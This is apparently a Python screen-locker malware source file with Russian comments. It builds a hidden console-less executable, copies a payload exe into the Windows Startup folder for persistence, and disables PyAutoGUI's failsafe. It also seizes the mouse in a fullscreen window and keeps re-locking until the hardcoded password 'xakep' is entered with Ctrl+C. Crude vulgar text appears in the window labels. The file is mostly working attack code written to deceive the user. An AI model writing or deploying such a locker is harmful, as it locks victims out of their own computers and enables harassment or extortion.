import pyautogui
from tkinter import Tk, Entry, Label
from pyautogui import click, moveTo
from time import sleep

# Сборщик
#----------------------------------------------------------------------------
import os

# Для того, чтобы пользователь не подозревал о запуске скрипта, использую параметр -w и переименовываю расширение в .pyw
# это уберет появление консоли

# П.с. узнал о существовании параметра --noconsole
# тогда команда будет выглядеть "os.system("pyinstaller --noconsole --onefile main.py)"

os.system("pyinstaller --onefile -w main.pyw")

# Удаление ненужных файлов при сборке(можно удалить вручную или не удалять, это ни на что не влияет)

# os.rmdir("build")
# os.rmdir("__pycache_")

# os.remove("system.py")
# os.remove("system.spec")

#----------------------------------------------------------------------------


# Основной код

# Копирует расшифрованный файл с полезной нагрузкой в Автозагрузку
file_name = 'examp_d3.exe'
startup_path = '"%Appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"'

os.system(f'copy {file_name} {startup_path}')

#--------------------------------------------------
# Обнаружил в коде, при создания марафета для отгрузки на git. Код писал давно не знаю зачем, я это сюда вписал, без
# этого работает и работает лучше. Оставлю на памаять и для разбора.
# П.с. бтв заново создал экзешник, чтобы было все четко и без рекурсий

# root = tkinter.Tk() в даннром случа я повторно использовал окно Tk
# root.mainloop() а здесь я вызывал метод, который отображал маленькое окно локера,
# но локер бы не раскрылся пока я не совершил бы какое бы действие с этим окном
#--------------------------------------------------

# Функция проверки вводимого ключа
def callback(event):
    global k, entry
    if entry.get() == "xakep":
        k = True

# Функция которая определяет работу локера
def on_closing():
    # симуляция нажатия на
    click(width / 2, height / 2)
    # перемещение курсора к цетру экрана / Блокирование его в центре экрана
    moveTo(width / 2, height / 2)
    root.attributes("-fullscreen", True)
    # Если программу закроют через диспетчер, запустить ее заново
    root.protocol("WM_DELETE_WINDOW", on_closing)
    root.update()
    # Забиндил функцию проверки ввода пароля на ctrl + c
    root.bind('<Control-KeyPress-c>', callback)


# Tkinter – это пакет для Python, предназначенный для работы с библиотекой Tk(широко распространённая в мире GNU/Linux и
# других UNIX‐подобных систем, портирована также и на Microsoft Windows).
# Библиотека Tk содержит компоненты графического интерфейса пользователя. Входит в стандартную библиотеку Python.

# создаю окно
root = Tk()

# PyAutoGui позволяет Python управлять мышью и клавой для автоматизации взаимодействия
# с другими приложениями

# Т.к PyAutoGui предназначен для управления устройствами ввода, то у него существует параметр безопасности
# для предотвращения, к примеру случаев, когда неправильно написанный скрипт будет двигать хаотично курсор,
# мешая закрыть программу. Для это существует 'pyautogui.FAILSAFE' которые позволяет в начале запуска программы увести
# курсор в любой из углов для аварийного отключения программы. Я пишу локер, поэтому эта функция мне не нужна.)
pyautogui.FAILSAFE = False

# получение ширины и высоты окна
width = root.winfo_screenwidth()
height = root.winfo_screenheight()

# Задаю заголовок окна и запускаем в полноэкран
root.title('From Aboba with love')
root.attributes("-fullscreen", True)

# Размещаю поле для ввода пароля
entry = Entry(root, font=1)
entry.place(width=150, height=50, x=width/2-75, y=height/2-25)

# Создаю текстовые подписи и задаем их расположение(в левом верхнем углу)
labelO = Label(root, text="iЬ(•O•)Ji Locker Ьу penis (J 0 0°) J", font = 1)
labelO.grid(row=0, column=0)

# Подпись над полем для ввода пароля
labell = Label(root, text="Пиши пароль и жми Ctrl + С", font='Arial 20')
labell.place(x=width/2-75-130, y=height/2-25-100)

# Для прикола, задаю 2 секунду на возможность успеть вписать пароль заново.
root.update()
sleep(0.2)

# Симуляция клика левой кнопкой мыши в центр окна / Активация поля заполнения
click(width/2, height/2)

# Обнуление пароля
k = False

# Непрерывная проверка на правильный пароль
# Пока не введен правильный пароль постоянно вызываем локер
while not k:
    on_closing()



